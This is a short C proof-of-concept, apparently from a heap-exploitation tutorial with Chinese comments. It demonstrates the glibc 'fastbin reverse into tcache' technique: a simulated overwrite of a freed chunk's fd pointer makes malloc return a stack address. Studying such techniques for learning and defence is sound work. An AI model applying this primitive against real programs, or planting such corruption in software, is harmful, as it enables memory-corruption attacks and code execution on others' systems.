#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char *ptrs[14];
    for (int i = 0; i < 14; i++)
        ptrs[i] = malloc(0x10);

    for (int i = 0; i < 7; i++)
        free(ptrs[i]);

    // victim 為第八個 chunk
    // 而此 chunk 也會是 fastbin 當中的最後一塊 chunk
    char *victim = ptrs[7];
    free(victim);

    for (int i = 8; i < 14; i++)
        free(ptrs[i]);

    size_t stack_var[6];
    memset(stack_var, 0xcd, sizeof(stack_var));

    // ! vuln
    // 透過漏洞來蓋寫位於 fastbin 當中的 victim 的 fd
    *(size_t **) victim = &stack_var[0];

    // 清空 tcache
    for (int i = 0; i < 7; i++)
        ptrs[i] = malloc(0x10);

    // trigger exp
    // 執行後 fastbin 的 chunk 會倒著被放入 tcache 當中
    malloc(0x10);

    char *q = malloc(0x10);
    assert(q == (char *)&stack_var[2]);

    return 0;
}